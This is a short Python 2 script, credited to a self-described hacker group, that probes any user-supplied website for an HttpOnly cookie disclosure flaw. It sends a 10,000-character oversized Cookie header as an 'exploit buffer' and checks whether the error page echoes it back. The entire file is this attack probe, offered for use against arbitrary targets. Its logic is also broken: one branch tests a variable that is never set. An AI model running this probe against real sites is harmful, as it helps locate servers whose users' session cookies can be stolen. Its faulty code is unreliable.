#!/usr/bin/python
##############################################################
#####HttpOnly Cookie Disclosure - Test for vulnerability #####
####################By Frank3nstien ##########################
##################Venomous Hacker Group ######################
##############################################################
import urllib2 , os , sys , time #############################
##############################################################
#Clearing ####################################################
if sys.platform == 'win' or sys.platform == 'win32' or sys.platform == 'win64':
	clearing = 'cls' 
else: 
	clearing = 'clear' 
os.system(clearing) 
##########################################################
def Cookie_Exploit(url,Cookie):
	request = urllib2.Request(url)
	request.add_header('Cookie', Cookie)
	A = 0
	try:
		response = urllib2.urlopen(request)
		A = 1
	except urllib2.HTTPError as e: 
		status = e.code
		content = e.read()
		A = 0
	if A is 0:	
		Vuln = 0 	
		if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in content:
			print '\nTarget is Vulnerable'
			Vuln = 1
		else:
			print '\nTarget is not Vulnerable'
			if 'Bad Request' in content:
				print 'patched'
	if A is 1:
		print '\nTarget is Not Vulnerable'
		if 'Bad Request' in content:
			print 'patched'
###########################################################	
url = raw_input('\nSite For test:')   #http://google.com/
chkurl = 0
if 'http://' in url or 'https://' in url:
	chkurl = 1
if chkurl is 0:
	print '\nYou must input url Same: http://google.com/'
	time.sleep(0.01)
	sys.exit()
print '\nmaking Exploit Buffer\n'
Cookie = 'A'
Min = 1
Max = 10000
while Min < Max:
	Cookie += 'A'
	Min += 1
print '\nBuffer Ready\nSending....\n'	
try:
	Cookie_Exploit(url,Cookie)
except:
	print '\nSome Error in Engine please Email: venomoushackers@gmail.com'
print '\~ frank3nstien'
time.sleep(0.01)
